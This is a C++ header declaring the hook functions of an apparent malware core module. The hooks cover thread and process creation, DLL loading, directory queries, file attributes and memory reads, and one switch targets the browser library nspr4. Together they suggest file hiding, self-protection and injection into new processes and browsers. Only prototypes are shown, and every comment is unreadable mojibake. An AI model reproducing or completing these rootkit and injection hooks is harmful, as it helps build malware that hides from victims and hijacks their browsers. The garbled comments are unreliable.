/*
  ���� ����.
*/
#pragma once

#include "..\common\ntdll.h"
#define STATUS_PARTIAL_COPY 0x8000000D

namespace CoreHook
{
	void disableRPMHookerForCurrentThread(bool disable);
	void set_uHooks(HOOKWINAPI* temp, int i);
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ����������� ������� ����� ��� �������� ������.

    IN disable - true - ���������, false - ��������.
  */
  void disableFileHookerForCurrentThread(bool disable);
  
  /*
    ��������� ������ Core::CDPF_* ��� �������� ��������� �������� �� �������� ������. ����
    ������������ � ������ ��������� �������� ��������.

    IN processFlags - Core::CDPF_*. ����� �� ����� Core::CDPT_INHERITABLE_MASK �������� �����
                      ������������.

    Return          - true - � ������ ������,
                      false - � ������ �������.
  */
#if defined HOOKER_SETCHILDPROCESSFLAGS
  bool setChildProcessFlags(DWORD processFlags);
#endif

#if(BO_NSPR4 > 0)
  /*
    �������� ��� ��������� �����, ��� nspr4 ������� ���������� � �� ����� ��� ����������� �
    hookerLdrLoadDll.
  */
  void __forceinline markNspr4AsHooked(void);
#endif

  /*
    ����������� NtCreateThread.
  */  
  NTSTATUS NTAPI hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, HANDLE processHandle, PCLIENT_ID clientId, PCONTEXT threadContext, PINITIAL_TEB initialTeb, BOOLEAN createSuspended);

  /*
    ����������� NtCreateUserProcess.
  */
  NTSTATUS NTAPI hookerNtCreateUserProcess(PHANDLE processHandle, PHANDLE threadHandle, ACCESS_MASK processDesiredAccess, ACCESS_MASK threadDesiredAccess, POBJECT_ATTRIBUTES processObjectAttributes, POBJECT_ATTRIBUTES threadObjectAttributes, ULONG createProcessFlags, ULONG createThreadFlags, PVOID processParameters, PVOID parameter9, PVOID attributeList);

  /*
    ����������� LdrLoadDll.
  */
#if defined(HOOKER_LDRLOADDLL)
  NTSTATUS NTAPI hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICODE_STRING moduleFileName, PHANDLE moduleHandle);
#endif  
//#if defined(HOOKER_NTCREATESECTION)
//  NTSTATUS NTAPI hookerNtCreateSection(OUT PHANDLE  SectionHandle,
//                              IN ACCESS_MASK  DesiredAccess,
//                       IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
//                           IN PLARGE_INTEGER  MaximumSize OPTIONAL,
//                                    IN ULONG  SectionPageProtection,
//                                    IN ULONG  AllocationAttributes,
//                                   IN HANDLE  FileHandle OPTIONAL);
//#endif
  /*
    ����������� NtQueryDirectoryFile.
  */
#if defined NTQUERYDIRECTORYFILE
  NTSTATUS NTAPI hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE eventHandle, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan);
#endif

#if defined HOOKER_NTREADPROCESSMEMORY
  NTSTATUS NTAPI hookerNtReadVirtualMemory(HANDLE ProcessHandle,PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded);
#endif

#if defined HOOKER_NTQUERYVIRTUALMEMORY
  NTSTATUS NTAPI hookerNtQueryVirtualMemory(HANDLE ProcessHandle,PVOID BaseAddress,MEMORY_INFORMATION_CLASS MemoryInformationClass,PVOID MemoryInformation,ULONG MemoryInformationLength,PULONG ReturnLength);
#endif

  /*
    ����������� NtCreateFile.
  */
#if defined(HOOKER_NTCREATEFILE)
  NTSTATUS NTAPI hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, PIO_STATUS_BLOCK ioStatusBlock, PLARGE_INTEGER allocationSize, ULONG fileAttributes, ULONG shareAccess, ULONG createDisposition, ULONG createOptions, PVOID eaBuffer, ULONG eaLength);
#endif

#if defined(HOOKER_NTRESUMETHREAD)
  NTSTATUS NTAPI hookerNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount);
#endif

  /*
    ����������� GetFileAttributesExW
  */
  BOOL WINAPI hookerGetFileAttributesExW(LPCWSTR fileName, GET_FILEEX_INFO_LEVELS infoLevelId, LPVOID fileInformation);

  
};
